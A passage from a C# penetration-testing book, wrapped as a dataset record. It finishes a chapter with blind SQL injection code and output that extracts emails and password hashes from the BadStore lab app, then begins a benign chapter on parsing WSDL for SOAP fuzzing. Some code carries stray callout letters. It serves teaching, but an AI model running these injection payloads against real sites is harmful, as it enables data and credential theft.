unew List<byte> ();\nfor (int i = 0; i <= countLength; i++)\n{\nfor (int c = 48; c <= 58; c++)\n{\nstring getLength = \"fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT\";\ngetLength += \" IFNULL(CAST(CHAR_LENGTH(\" + column + \") AS CHAR),0x20) FROM\";\ngetLength += \" userdb ORDER BY email LIMIT \" + row + \",1),\" + i;\ngetLength += \",1))=\"+c+\") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye\";\nstring response = vMakeRequest(getLength);\nif (response.wContains(\"parentheses not balanced\"))\n{\ncountBytes.xAdd((byte)c);\nbreak;\n}\n}\n}\nListing 2-49: The second loop within the GetLength() method retrieving the actual length\nof the value\nAs you can see in Listing 2-49, we create a generic List<byte> u to store\nthe values gleaned by the payloads so that we can convert them into integers\nand return them to the caller. As we iterate over the length of the count,\n48 Chapter 2\nwe send HTTP requests to test the bytes in the value using MakeRequest() v\nand the SQL injection payload. If the response contains the \"parentheses not\nbalanced\" error w, we know our SQL payload evaluated to true. This means\nwe need to store the value of c (the character that was determined to match\ni) as a byte x so that we can convert the List<byte> to a human-readable\nstring. Since we found the current character, we don’t need to test the given\nindex of the count anymore, so we break to move on to the next index.\nNow we need to return the count and finish the method, as shown in\nListing 2-50.\nif (countBytes.Count > 0)\nreturn uint.Parse(Encoding.ASCII.vGetString(countBytes.ToArray()));\nelse\nreturn 0;\n}\nListing 2-50: The final line in the GetLength() method, converting the value for the length\ninto an integer and returning it\nOnce we have the bytes of the count, we can use GetString() v to con-\nvert the bytes gathered into a human-readable string. This string is passed\nto int.Parse() u and returned to the caller so that we can begin gathering\nthe actual values from the database.\nWriting GetValue() to Retrieve a Given Value\nWe finish this exploit with the GetValue() method, as shown in Listing 2-51.\nprivate static string GetValue(int rowu, string columnv, int lengthw)\n{\nList<byte> valBytes = xnew List<byte>();\nfor (int i = 0; i <= length; i++)\n{\nyfor(int c = 32; c <= 126; c++)\n{\nstring getChar = \"fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT\";\ngetChar += \" IFNULL(CAST(\"+column+\" AS CHAR),0x20) FROM userdb ORDER BY\";\ngetChar += \" email LIMIT \"+row+\",1),\"+i+\",1))=\"+c+\") THEN 0x28 ELSE 0x41\";\ngetChar += \" END)) AND 'YIye'='YIye\";\nstring response = MakeRequest(getChar);\nif (response.Contains(z\"parentheses not balanced\"))\n{\nvalBytes.Add((byte)c);\nbreak;\n}\n}\n}\nreturn Encoding.ASCII.{GetString(valBytes.ToArray());\n}\nListing 2-51: The GetValue() method, which will retrieve the value of a given column at a\ngiven row\nFuzzing and Exploiting XSS and SQL Injection 49\nThe GetValue() method requires three arguments: the database row\nwe are pulling the data from u, the database column in which the value\nresides v, and the length of the value to be gleaned from the database w.\nA new List<byte> x is instantiated to store the bytes of the value gathered.\nIn the innermost for loop y, we iterate from 32 to 126 because 32 is the\nlowest integer that corresponds to a printable ASCII character, and 126 is\nthe highest. Earlier when retrieving the counts, we only iterated from 48\nto 58 because we were only concerned with the numerical ASCII character.\nAs we iterate through these values, we send a payload comparing the\ncurrent index of the value in the database to the current value of the itera-\ntion of the inner for loop. When the response is returned, we look for the\nerror \"parentheses not balanced\" z and, if it is found, cast the value of the\ncurrent inner iteration to a byte and store it in the list of bytes. The last line\nof the method converts this list to a string using GetString() { and returns\nthe new string to the caller.\nCalling the Methods and Printing the Values\nAll that is left now is to call the new methods GetLength() and GetValue() in\nour Main() method and to print the values gleaned from the database. As\nshown in Listing 2-52, we add the for loop that calls the GetLength() and\nGetValue() methods to the end of our Main() method so that we can extract\nthe email addresses and password hashes from the database.\nfor (int row = 0; row < count; row++)\n{\nforeach (string column in new string[] {\"email\", \"passwd\"})\n{\nConsole.Write(\"Getting length of query value... \");\nint valLength = uGetLength(row, column);\nConsole.WriteLine(valLength);\nConsole.Write(\"Getting value... \");\nstring value = vGetValue(row, column, valLength);\nConsole.WriteLine(value);\n}\n}\nListing 2-52: The for loop added to the Main() method, which consumes the GetLength()\nand GetValue() methods\nFor each row in the userdb table, we first get the length u and value v\nof the email field and then the value of the passwd field (an MD5 hash of the\nuser’s password). Next, we print the length of the field and its value, with\nresults like those shown in Listing 2-53.\nThere are 23 rows in the userdb table\nGetting length of query value... 13\nGetting value... AAA_Test_User\nGetting length of query value... 32\nGetting value... 098F6BCD4621D373CADE4E832627B4F6\n50 Chapter 2\nGetting length of query value... 5\nGetting value... admin\nGetting length of query value... 32\nGetting value... 5EBE2294ECD0E0F08EAB7690D2A6EE69\n--snip--\nGetting length of query value... 18\nGetting value... tommy@customer.net\nGetting length of query value... 32\nGetting value... 7f43c1e438dc11a93d19616549d4b701\nListing 2-53: The results of our exploit\nAfter enumerating the number of users in the database, we iterate over\neach user and pull the username and password hash out of the database.\nThis process is much slower than the UNION we performed above, but UNION\ninjections are not always available. Understanding how a Boolean-based\nattack works when exploiting SQL injections is crucial to effectively exploit-\ning many SQL injections.\nConclusion\nThis chapter has introduced you to fuzzing for and exploiting XSS and SQL\ninjection vulnerabilities. As you’ve seen, BadStore contains numerous SQL\ninjection, XSS, and other vulnerabilities, all of which are exploitable in\nslightly different ways. In the chapter, we implemented a small GET request\nfuzzing application to search query string parameters for XSS or errors\nthat could mean a SQL injection vulnerability exists. Using the power-\nful and flexible HttpWebRequest class to make and retrieve HTTP requests\nand responses, we were able to determine that the searchquery parameter,\nwhen searching for items in BadStore, is vulnerable to both XSS and SQL\ninjection.\nOnce we wrote a simple GET request fuzzer, we captured an HTTP\nPOST request from BadStore using the Burp Suite HTTP proxy and Firefox\nin order to write a small fuzzing application for POST requests. Using the\nsame classes as those in the previous GET requests fuzzer, but with some\nnew methods, we were able to find even more SQL injection vulnerabilities\nthat could be exploitable.\nNext, we moved on to more complicated requests, such as HTTP\nrequests with JSON. Using a vulnerable JSON web application, we cap-\ntured a request used to create new users on the web app using Burp Suite.\nIn order to efficiently fuzz this type of HTTP request, we introduced the\nJson.NET library, which makes it easy to parse and consume JSON data.\nFinally, once you had a good grasp on how fuzzers can find possible\nvulnerabilities in web applications, you learned how to exploit them. Using\nBadStore again, we wrote a UNION-based SQL injection exploit that could\npull out the usernames and password hashes in the BadStore database with\na single HTTP request. In order to efficiently pull the extracted data out of\nthe HTML returned by the server, we used the regular expression classes\nRegex, Match, and MatchCollection.\nFuzzing and Exploiting XSS and SQL Injection 51\nOnce the simpler UNION exploit was complete, we wrote a Boolean-based\nblind SQL injection on the same HTTP request. Using the HttpWebRequest\nclass, we determined which of the HTTP responses were true or false,\nbased on SQL injection payloads passed to the web application. When we\nknew how the web application would behave in response to true-or-false\nquestions, we began asking the database true-or-false questions in order to\nglean information from it 1 byte at a time. The Boolean-based blind exploit\nis more complicated than the UNION exploit and requires more time and HTTP\nrequests to complete, but it is particularly useful when a UNION isn’t possible.\n52 Chapter 2",
    "question": "What is the process for identifying and exploiting SQL injection and XSS vulnerabilities in web applications using a mutational fuzzer and the BadStore example?",
    "summary": "This chapter explains how to create and use fuzzers to detect cross-site scripting (XSS) and SQL injection vulnerabilities in web applications. It details the process of setting up a virtual machine with a vulnerable system, writing a mutational fuzzer to test GET and POST requests, and using it to identify vulnerable parameters. The chapter also covers how to exploit these vulnerabilities, including using SQL injection to extract user data and XSS to inject malicious scripts. It provides examples of both UNION-based and Boolean-based SQL injection techniques, demonstrating how to retrieve database information even when direct access is not possible. The chapter concludes with the practical application of these methods to a vulnerable system called BadStore."
  },
  {
    "start": 38,
    "end": 53,
    "text": "3\nfu z zinG SoaP enDPointS\nAs a penetration tester, you may run into\napplications or servers that offer program-\nmatic API access via SOAP endpoints. SOAP,\nor Simple Object Access Protocol, is a common\nenterprise technology that enables language-agnostic\naccess to programming APIs. Generally speaking,\nSOAP is used over the HTTP protocol, and it uses XML to organize the\ndata sent to and from the SOAP server. The Web Service Description\nLanguage (WSDL) describes the methods and functionality exposed\nthrough SOAP endpoints. By default, SOAP endpoints expose WSDL\nXML documents that clients can easily parse so that they can interface\nwith the SOAP endpoints, and C# has several classes that make this\npossible.\nThis chapter builds on your knowledge of how to programmatically\ncraft HTTP requests to detect XSS and SQL injection vulnerabilities,\nexcept that it focuses on SOAP XML instead. This chapter also shows you\nhow to write a small fuzzer to download and parse the WSDL file exposed\nby a SOAP endpoint and then use the information in the WSDL file to gen-\nerate HTTP requests for the SOAP service. Ultimately, you’ll be able to sys-\ntematically and automatically look for possible SQL injection vulnerabilities\nin SOAP methods.\nSetting up the Vulnerable endpoint\nFor this chapter, you’ll use a vulnerable endpoint in a preconfigured vir-\ntual appliance called CsharpVulnSoap (which should have a file extension\nof .ova) available on the VulnHub website (http://www.vulnhub.com/). After\ndownloading the appliance, you can import it into VirtualBox or VMware\non most operating systems by double-clicking the file. Once the appliance is\ninstalled, log in with a password of password or use a Guest session to open\na terminal. From there, enter ifconfig to find the virtual appliance’s IP\naddress. By default, this appliance will be listening on a host-only interface,\nunlike in previous chapters where we bridged the network interfaces.\nAfter bringing the endpoint up in a web browser, as shown in Figure 3-1,\nyou can use the menu items on the left side of the screen (AddUser, ListUsers,\nGetUser, and DeleteUser) to see what the functions exposed by the SOAP\nendpoint return when used. Navigating to http://<ip>/Vulnerable.asmx?WSDL\nshould present you with the WSDL document describing the available func-\ntions in a parseable XML file. Let’s dig into the structure of this document.\nFigure 3-1: The vulnerable endpoint as seen from Firefox\n54 Chapter 3\nParsing the wSdL\nWSDL XML documents are a bit complicated. Even a simple WSDL docu-\nment like the one we’ll parse is not trivial. However, because C# has excellent\nclasses for parsing and consuming XML files, getting the WSDL parsed\ncorrectly and into a state that lets us interact with the SOAP services in an\nobject-oriented fashion is pretty bearable.\nA WSDL document is essentially\na bunch of XML elements that relate\nto one another in a logical way, from\nTypes\nthe bottom of the document to the\ntop. At the bottom of the document,\nMessage\nyou interact with the service to make\na request to the endpoint. From\nthe service, you have the notion of Port Type\nports. These ports point to a binding,\nOperation\nwhich in turn points to a port type.\nInput\nThe port type contains the opera-\nOutput\ntions (or methods) available on that\nendpoint. The operations contain an\ninput and an output, which both point\nBinding\nto a message. The message points to a\ntype, and the type contains the param-\neters required to call the method. Service\nFigure 3-2 explains this concept Port\nvisually.\nOur WSDL class constructor will\nwork in reverse order. First, we’ll create\nFigure 3-2: The basic logical layout of\nthe constructor, and then we’ll cre- a WSDL document\nate a class to handle parsing each part\nof the WSDL document, from types to\nservices.\nCreating a Class for the WSDL Document\nWhen you’re parsing WSDL programmatically, it’s easiest to start at the top\nof the document with the SOAP types and work your way down the docu-\nment. Let’s create a class called WSDL that encompasses the WSDL document.\nThe constructor is relatively simple, as shown in Listing 3-1.\npublic WSDL (XmlDocument doc)\n{\nXmlNamespaceManager nsManager = new uXmlNamespaceManager(doc.NameTable);\nnsManager.vAddNamespace(\"wsdl\", doc.DocumentElement.NamespaceURI);\nnsManager.AddNamespace(\"xs\", \"http://www.w3.org/2001/XMLSchema\");\nParseTypes(doc, nsManager);\nParseMessages(doc, nsManager);\nParsePortTypes(doc, nsManager);\nParseBindings(doc, nsManager);\nFuzzing SOAP Endpoints 55\nParseServices(doc, nsManager);\n}\nListing 3-1: The WSDL class constructor\nThe constructor of our WSDL class calls just a handful of methods\n(which we’ll write next), and it expects the retrieved XML document that\ncontains all the definitions of the web service as a parameter. The first\nthing we need to do is define the XML namespaces we’ll be referencing\nwhile using XPath queries (which are covered in Listing 3-3 and later list-\nings) when we implement the parsing methods. To do this, we create a\nnew XmlNamespaceManager u and use the AddNamespace() method v to add two\nnamespaces, wsdl and xs. Then we call the methods that will parse the ele-\nments of the WSDL document, starting with types and working our way\ndown to services. Each method takes two arguments: the WSDL document\nand the namespace manager.\nWe also need access to a few properties of the WSDL class that correspond\nto the methods called in the constructor. Add the properties shown in\nListing 3-2 to the WSDL class.\npublic List<SoapType> Types { get; set; }\npublic List<SoapMessage> Messages { get; set; }\npublic List<SoapPortType> PortTypes { get; set; }\npublic List<SoapBinding> Bindings { get; set; }\npublic List<SoapService> Services { get; set; }\nListing 3-2: Public properties of the WSDL class\nThese properties of the WSDL class are consumed by the fuzzer (which\nis why they are public) and by the methods called in the constructor. The\nproperties are lists of the SOAP classes we’ll implement in this chapter.\nWriting the Initial Parsing Methods\nFirst, we’ll write the methods that are called in Listing 3-1. Once we have\nthose methods implemented, we’ll move on to create the classes each\nmethod relies on. This is going to be a bit of work, but we’ll get through\nit together!\nWe’ll start by implementing the first method called in Listing 3-1,\nParseTypes(). All the methods called from the constructor are relatively\nsimple and will look similar to Listing 3-3.\nprivate void ParseTypes(XmlDocument wsdl, XmlNamespaceManager nsManager)\n{\nthis.Types = new List<SoapType>();\nstring xpath = u\"/wsdl:definitions/wsdl:types/xs:schema/xs:element\";\nXmlNodeList nodes = wsdl.DocumentElement.SelectNodes(xpath, nsManager);\nforeach (XmlNode type in nodes)\nthis.Types.Add(new SoapType(type));\n}\nListing 3-3: The ParseTypes() method called in the WSDL class constructor\n56 Chapter 3\nBecause these methods are only called internally in the WSDL constructor,\nwe use the private keyword so that only the WSDL class can access them. The\nParseTypes() method accepts a WSDL document and the namespace man-\nager (used to resolve namespaces in the WSDL document) as arguments.\nNext, we instantiate a new List object and assign it to the Types property. We\nthen iterate over the XML elements in the WSDL using the XPath facilities\navailable to XML documents in C#. XPath lets a programmer traverse and\nconsume an XML document based on node paths within the document.\nIn this example, we use an XPath query u to enumerate all the SOAP type\nnodes from the document using the SelectNodes() method. Then we iterate\nover those SOAP types and pass each node to the SoapType class constructor,\nwhich is one of the classes we’ll implement after entering the initial pars-\ning methods. Finally, we add the newly instantiated SoapType objects to the\nSoapType list property of the WSDL class.\nEasy enough, right? We’ll employ this pattern of using an XPath query\nto iterate over specific nodes a few more times to consume a few other types\nof nodes we need from the WSDL document. XPath is quite powerful and is\ngreat for working with the C# language in general.\nNow we’ll implement the next method called in the WSDL constructor to\nparse the WSDL document, ParseMessages(), as detailed in Listing 3-4.\nprivate void ParseMessages(XmlDocument wsdl, XmlNamespaceManager nsManager)\n{\nthis.Messages = new List<SoapMessage>();\nstring xpath = u\"/wsdl:definitions/wsdl:message\";\nXmlNodeList nodes = wsdl.DocumentElement.SelectNodes(xpath, nsManager);\nforeach (XmlNode node in nodes)\nthis.Messages.Add(new SoapMessage(node));\n}\nListing 3-4: The ParseMessages() method called in the WSDL class constructor\nFirst, we need to instantiate and assign a new List to hold the SoapMessage\nobjects. (SoapMessage is a class we’ll implement in “Creating the SoapMessage\nClass to Define Sent Data” on page 60.) Using an XPath query u to select\nthe message nodes from the WSDL document, we iterate over the nodes\nreturned by the SelectNodes() method and pass them to the SoapMessage con-\nstructor. These newly instantiated objects are added to the Messages property\nof the WSDL class for later consumption.\nThe next few methods called from the WSDL class are similar to the previ-\nous two. By now, they should seem relatively straightforward to you, given\nhow the previous two methods have worked. These methods are all detailed\nin Listing 3-5.\nprivate void ParsePortTypes(XmlDocument wsdl, XmlNamespaceManager nsManager)\n{\nthis.PortTypes = new List<SoapPortType>();\nstring xpath = \"/wsdl:definitions/wsdl:portType\";\nXmlNodeList nodes = wsdl.DocumentElement.SelectNodes(xpath, nsManager);\nforeach (XmlNode node in nodes)\nFuzzing SOAP Endpoints 57\nthis.PortTypes.Add(new SoapPortType(node));\n}\nprivate void ParseBindings(XmlDocument wsdl, XmlNamespaceManager nsManager)\n{\nthis.Bindings = new List<SoapBinding>();\nstring xpath = \"/wsdl:definitions/wsdl:binding\";\nXmlNodeList nodes = wsdl.DocumentElement.SelectNodes(xpath, nsManager);\nforeach (XmlNode node in nodes)\nthis.Bindings.Add(new SoapBinding(node));\n}\nprivate void ParseServices(XmlDocument wsdl, XmlNamespaceManager nsManager)\n{\nthis.Services = new List<SoapService>();\nstring xpath = \"/wsdl:definitions/wsdl:service\";\nXmlNodeList nodes = wsdl.DocumentElement.SelectNodes(xpath, nsManager);\nforeach (XmlNode node in nodes)\nthis.Services.Add(new SoapService(node));\n}\nListing 3-5: The rest of the initial parsing methods in the WSDL class\nTo fill the PortTypes, Bindings, and Services properties, we use XPath que-\nries to find and iterate over the relevant nodes; then we instantiate specific\nSOAP classes, which we’ll implement next, and add them to the lists so that\nwe can access them later when we need to build the WSDL fuzzer logic.\nThat’s it for the WSDL class. A constructor, a handful of properties to\nstore data relevant to the WSDL class, and some methods to parse out a WSDL\ndocument are all that you need to get started. Now we need to implement\nthe supporting classes. Within the parsing methods, we used some classes\nthat haven’t yet been implemented (SoapType, SoapMessage, SoapPortType,\nSoapBinding, and SoapService). We’ll start with the SoapType class.\nWriting a Class for the SOAP Type and Parameters\nTo complete the ParseTypes() method, we need to implement the SoapType\nclass. The SoapType class is a relatively simple one. All it needs is a construc-\ntor and a couple of properties, as shown in Listing 3-6.\npublic class SoapType\n{\npublic SoapType(XmlNode type)\n{\nthis.Name = type.uAttributes[\"name\"].Value;\nthis.Parameters = new List<SoapTypeParameter>();\nif (type.vHasChildNodes && type.FirstChild.HasChildNodes)\n{\nforeach (XmlNode node in type.wFirstChild.FirstChild.xChildNodes)\nthis.Parameters.Add(new SoapTypeParameter(node));\n}\n}\n58 Chapter 3\npublic string Name { get; set; }\npublic List<SoapTypeParameter> Parameters { get; set; }\n}\nListing 3-6: The SoapType class used in the WSDL fuzzer\nThe logic in the SoapType constructor is similar to that in the previous\nparsing methods (in Listings 3-4 and 3-5), except we’re not using XPath to\nenumerate the nodes we’re iterating over. We could have, but I wanted to\nshow you another way of iterating over XML nodes. Usually, when you’re\nparsing XML, XPath is the way to go, but XPath can be computationally\nexpensive. In this case, we’ll write an if statement to check whether we have\nto iterate over the child nodes. Iterating over the child nodes using a foreach\nloop to find the relevant XML element involves slightly less code than using\nXPath in this particular instance.\nThe SoapType class has two properties: a Name property, which is a string,\nand a list of parameters (the SoapTypeParameter class, which we’ll implement\nshortly). Both of these properties are used in the SoapType constructor and\nare public so that they can be consumed outside the class later on.\nWe use the Attributes property u on the node passed into the con-\nstructor arguments to retrieve the node’s name attribute. The value of the\nname attribute is assigned to the Name property of the SoapType class. We\nalso instantiate the SoapTypeParameter list and assign the new object to the\nParameters property. Once this is done, we use an if statement to determine\nwhether we need to iterate over child nodes in the first place, since we’re\nnot using XPath to iterate over any child nodes. Using the HasChildNodes\nproperty v, which returns a Boolean value, we can determine whether we\nhave to iterate over the child nodes. If the node has child nodes, and if the\nfirst child of that node also has child nodes, we’ll iterate over them.\nEvery XmlNode class has a FirstChild property and a ChildNodes property x\nthat returns an enumerable list of the child nodes available. In the foreach\nloop, we use a chain of FirstChild properties w to iterate over the child\nnodes of the first child of the first child of the node passed in.\nAn example of an XML node that would be passed to the SoapType con-\nstructor is shown in Listing 3-7.\nAfter iterating over the relevant child nodes in the SoapType node that’s\npassed in, we instantiate a new SoapTypeParameter class by passing the current\nchild node into the SoapTypeParameter constructor. The new object is stored\nin the Parameters list for access later on.\n<xs:element name=\"AddUser\">\n<xs:complexType>\n<xs:sequence>\n<xs:element minOccurs=\"0\" maxOccurs=\"1\" name=\"username\" type=\"xs:string\"/>\n<xs:element minOccurs=\"0\" maxOccurs=\"1\" name=\"password\" type=\"xs:string\"/>\n</xs:sequence>\n</xs:complexType>\n</xs:element>\nListing 3-7: Sample SoapType XML\nFuzzing SOAP Endpoints 59\nNow let’s create the SoapTypeParameter class. The SoapTypeParameter class is\nalso relatively simple. In fact, no iteration over child nodes is required, just\nbasic information gathering, as Listing 3-8 shows.\npublic class SoapTypeParameter\n{\npublic SoapTypeParameter(XmlNode node)\n{\nuif (node.Attributes[\"maxOccurs\"].Value == \"unbounded\")\nthis.MaximumOccurrence = int.MaxValue;\nelse\nthis.MaximumOccurrence = int.Parse(node.Attributes[\"maxOccurs\"].Value);\nthis.MinimumOccurrence = int.Parse(node.Attributes[\"minOccurs\"].Value);\nthis.Name = node.Attributes[\"name\"].Value;\nthis.Type = node.Attributes[\"type\"].Value;\n}\npublic int MinimumOccurrence { get; set; }\npublic int MaximumOccurrence { get; set; }\npublic string Name { get; set; }\npublic string Type { get; set; }\n}\nListing 3-8: The SoapTypeParameter class\nAn example of an XML node passed to the SoapTypeParameter construc-\ntor is shown in Listing 3-9.\n<xs:element minOccurs=\"0\" maxOccurs=\"1\" name=\"username\" type=\"xs:string\"/>\nListing 3-9: Sample XML node passed to the SoapTypeParameter constructor\nGiven an XML node like this, we can expect a few things to happen\nin our method. First, this is a very basic WSDL parameter that defines a\nparameter named username that is of type string. It can occur at a mini-\nmum zero times and at most once. Look closely at the code in Listing 3-8,\nand you’ll notice that there’s an if statement u that checks the value of\nmaxOccurs. Unlike minOccurs, maxOccurs can be either an integer or the string\nvalue unbounded, so we have to check the maxOccurs value before passing it\nto the int.Parse() method to see what the value is.\nWithin our SoapTypeParameter constructor, we first assign the\nMaximumOccurrence property based on the node’s maxOccurs attribute. We\nthen assign the MinimumOccurrence, Name, and Type properties based on the\ncorresponding node attributes.\nCreating the SoapMessage Class to Define Sent Data\nA SOAP message defines a set of data that the web service either expects\nor responds with for a given operation. It references the SOAP types and\nparameters previously parsed to present data to or consume data from the\nclient application and is made up of parts, which is the technical term. An\nexample of a SOAP 1.1 message XML element is provided in Listing 3-10.\n60 Chapter 3\n<message name=\"AddUserHttpGetIn\">\n<part name=\"username\" type=\"s:string\"/>\n<part name=\"password\" type=\"s:string\"/>\n</message>\nListing 3-10: Sample SOAP message XML element\nOur SoapMessage class, which consumes an XML element like the one in\nListing 3-10, is detailed in Listing 3-11.\npublic class SoapMessage\n{\npublic SoapMessage(XmlNode node)\n{\nthis.Name = unode.Attributes[\"name\"].Value;\nthis.Parts = new List<SoapMessagePart>();\nif (node.HasChildNodes)\n{\nforeach (XmlNode part in node.ChildNodes)\nthis.Parts.Add(new SoapMessagePart(part));\n}\n}\npublic string Name { get; set; }\npublic List<SoapMessagePart> Parts { get; set; }\n}\nListing 3-11: The SoapMessage class\nFirst, we assign the name of the message to the Name property u\nof the SoapMessage class. We then instantiate a new List of parts called\nSoapMessagePart and iterate over each <part> element, passing the element\nto the SoapMessagePart constructor and saving the new SoapMessagePart for\nlater use by adding it to the Parts list.\nImplementing a Class for Message Parts\nLike the previous SOAP classes we have implemented, the SoapMessagePart\nclass is a simple class, as Listing 3-12 shows.\npublic class SoapMessagePart\n{\npublic SoapMessagePart(XmlNode part)\n{\nthis.Name = upart.Attributes[\"name\"].Value;\nif (vpart.Attributes[\"element\"] != null)\nthis.Element = part.Attributes[\"element\"].Value;\nelse if ( part.Attributes[\"type\"].Value != null)\nthis.Type = part.Attributes[\"type\"].Value;\nelse\nthrow new ArgumentException(\"Neither element nor type is set.\", \"part\");\n}\npublic string Name { get; set; }\npublic string Element { get; set; }\nFuzzing SOAP Endpoints 61\npublic string Type { get; set; }\n}\nListing 3-12: The SoapMessagePart class\nThe SoapMessagePart class constructor takes a single argument, XmlNode,\nthat contains the name and the type or element of the part within the\nSoapMessage. The SoapMessagePart class defines three public properties: the\npart’s Name, Type, and Element, all of which are strings. First, we store the\nname of the part in the Name property u. Then, if we have an attribute\ncalled element v, we assign the value of the element attribute to the Element\nproperty. If the element attribute doesn’t exist, the type attribute must exist,\nso we assign the value of the type attribute to the Type property. Only two of\nthese properties will be set for any given SOAP part—a SOAP part always\nhas a Name and either a Type or Element. The Type or Element will be set depend-\ning on whether the part is a simple type (such as a string or integer) or a\ncomplex type encompassed by another XML element within the WSDL. We\nhave to create a class for each kind of parameter, and we’ll start by imple-\nmenting the Type class.\nDefining Port Operations with the SoapPortType Class\nWith the SoapMessage and SoapMessagePart classes defined to complete\nthe ParseMessages() method from Listing 3-4, we move on to create the\nSoapPortType class, which will complete the ParsePortTypes() method. The\nSOAP port type defines the operations available on a given port (not to be\nconfused with a network port), and parsing it is detailed in Listing 3-13.\npublic class SoapPortType\n{\npublic SoapPortType(XmlNode node)\n{\nthis.Name = unode.Attributes[\"name\"].Value;\nthis.Operations = new List<SoapOperation>();\nforeach (XmlNode op in node.ChildNodes)\nthis.Operations.Add(new SoapOperation(op));\n}\npublic string Name { get; set; }\npublic List<SoapOperation> Operations { get; set; }\n}\nListing 3-13: The SoapPortType class used in the ParsePortTypes() method\nThe pattern of how these SOAP classes work continues: the SoapPortType\nclass in Listing 3-13 defines a small constructor that accepts an XmlNode from\nthe WSDL document. It requires two public properties: a SoapOperation list\nand a Name string. Within the SoapPortType constructor, we first assign the Name\nproperty u to the XML name attribute. We then create a new SoapOperation list\nand iterate over each of the child nodes in the portType element. As we iterate,\nwe pass the child node to the SoapOperation constructor (which we build in the\n62 Chapter 3\nnext section) and store the resulting SoapOperation in our list. An example\nof an XML node from the WSDL document that would be passed to the\nSoapPortType class constructor is shown in Listing 3-14.\n<portType name=\"VulnerableServiceSoap\">\n<operation name=\"AddUser\">\n<input message=\"s0:AddUserSoapIn\"/>\n<output message=\"s0:AddUserSoapOut\"/>\n</operation>\n<operation name=\"ListUsers\">\n<input message=\"s0:ListUsersSoapIn\"/>\n<output message=\"s0:ListUsersSoapOut\"/>\n</operation>\n<operation name=\"GetUser\">\n<input message=\"s0:GetUserSoapIn\"/>\n<output message=\"s0:GetUserSoapOut\"/>\n</operation>\n<operation name=\"DeleteUser\">\n<input message=\"s0:DeleteUserSoapIn\"/>\n<output message=\"s0:DeleteUserSoapOut\"/>\n</operation>\n</portType>\nListing 3-14: Sample portType XML node passed to the SoapPortType class constructor\nAs you can see, the portType element contains the operations we’ll be\nable to perform, such as listing, creating, and deleting users. Each of the\noperations maps to a given message, which we parsed in Listing 3-11.\nImplementing a Class for Port Operations\nIn order to use the operations from the SoapPortType class constructor, we\nneed to create the SoapOperation class, as shown in Listing 3-15.\npublic class SoapOperation\n{\npublic SoapOperation(XmlNode op)\n{\nthis.Name = uop.Attributes[\"name\"].Value;\nforeach (XmlNode message in op.ChildNodes)\n{\nif (message.Name.EndsWith(\"input\"))\nthis.Input = message.Attributes[\"message\"].Value;\nelse if (message.Name.EndsWith(\"output\"))\nthis.Output = message.Attributes[\"message\"].Value;\n}\n}\npublic string Name { get; set; }\npublic string Input { get; set; }\npublic string Output { get; set; }\n}\nListing 3-15: The SoapOperation class\nFuzzing SOAP Endpoints 63\nThe SoapOperation constructor accepts an XmlNode as the single argu-\nment. The first thing we do is assign a property of the SoapOperation class\ncalled Name u to the name attribute of the operation XML element passed\nto the constructor. We then iterate over each of the child nodes, checking\nwhether the name of the element ends with either \"input\" or \"output\". If the\nname of the child node ends with \"input\", we assign the Input property to\nthe name of the input element. Otherwise, we assign the Output property\nto the name of the output element. Now that the SoapOperation class has\nbeen implemented, we can move on to the classes we need to finish up\nthe ParseBindings() method.\nDefining Protocols Used in SOAP Bindings\nThe two general types of bindings are HTTP and SOAP. It seems redun-\ndant, but the HTTP bindings transport data over the general HTTP pro-\ntocol, using an HTTP query string or POST parameters. SOAP bindings\nuse either the SOAP 1.0 or SOAP 1.1 protocol over simple TCP sockets or\nnamed pipes, which encompass the data flowing to and from the server\nin XML. The SoapBinding class lets you decide how to communicate with a\ngiven SOAP port depending on the binding.\nA sample binding node from the WSDL is shown in Listing 3-16.\n<binding name=\"VulnerableServiceSoap\" type=\"s0:VulnerableServiceSoap\">\n<soap:binding transport=\"http://schemas.xmlsoap.org/soap/http\"/>\n<operation name=\"AddUser\">\n<soap:operation soapAction=\"http://tempuri.org/AddUser\" style=\"document\"/>\n<input>\n<soap:body use=\"literal\"/>\n</input>\n<output>\n<soap:body use=\"literal\"/>\n</output>\n</operation>\n</binding>\nListing 3-16: Sample binding XML node from the WSDL\nIn order to parse this XML node, our class needs to pull some key\ninformation out of the binding node, as shown in Listing 3-17.\npublic class SoapBinding\n{\npublic SoapBinding(XmlNode node)\n{\nthis.Name = unode.Attributes[\"name\"].Value;\nthis.Type = vnode.Attributes[\"type\"].Value;\nthis.IsHTTP = false;\nthis.Operations = new List<SoapBindingOperation>();\nforeach (XmlNode op in node.ChildNodes)\n{\nif (wop.Name.EndsWith(\"operation\"))\n{\n64 Chapter 3\nthis.Operations.Add(new SoapBindingOperation(op));\n}\nelse if (op.Name == \"http:binding\")\n{\nthis.Verb = op.Attributes[\"verb\"].Value;\nthis.IsHTTP = true;\n}\n}\n}\npublic string Name { get; set; }\npublic List<SoapBindingOperation> Operations { get; set; }\npublic bool IsHTTP { get; set; }\npublic string Verb { get; set; }\npublic string Type { get; set; }\n}\nListing 3-17: The SoapBinding class\nAfter accepting an XmlNode as the argument to the SoapBinding construc-\ntor, we first assign the values of the name and type attributes of the node\nto the Name u and Type v properties of the SoapBinding class. By default, we\nset the IsHTTP Boolean property to false. The IsHTTP property helps us deter-\nmine how to send the data we want to fuzz, using either HTTP parameters\nor SOAP XML.\nAs we iterate over the child nodes, we test whether each child node’s\nname ends with \"operation\" w, and, if so, we add the operation to the\nSoapBindingOperation list. If the child node’s name does not end with\n\"operation\", the node should be an HTTP binding. We ensure this is the\ncase with an else if statement, and we set the HTTP Verb property to the\nvalue of the verb attribute of the child node. We also set IsHTTP to true. The\nVerb property should contain either GET or POST, which tells us whether\nthe data sent to the SOAP endpoint will be in query string (GET) param-\neters or POST parameters.\nNext, we’ll implement the SoapBindingOperation class.\nCompiling a List of Operation Child Nodes\nThe SoapBindingOperation class is a small class consumed in the SoapBinding\nclass constructor. It defines a few string properties that will be assigned\nvalues based on the operation node passed to the constructor, as shown\nin Listing 3-18.\npublic class SoapBindingOperation\n{\npublic SoapBindingOperation(XmlNode op)\n{\nthis.Name = uop.Attributes[\"name\"].Value;\nforeach (XmlNode node in op.ChildNodes)\n{\nif (vnode.Name == \"http:operation\")\nthis.Location = node.Attributes[\"location\"].Value;\nelse if (node.Name == \"soap:operation\" || node.Name == \"soap12:operation\")\nFuzzing SOAP Endpoints 65\nthis.SoapAction = node.Attributes[\"soapAction\"].Value;\n}\n}\npublic string Name { get; set; }\npublic 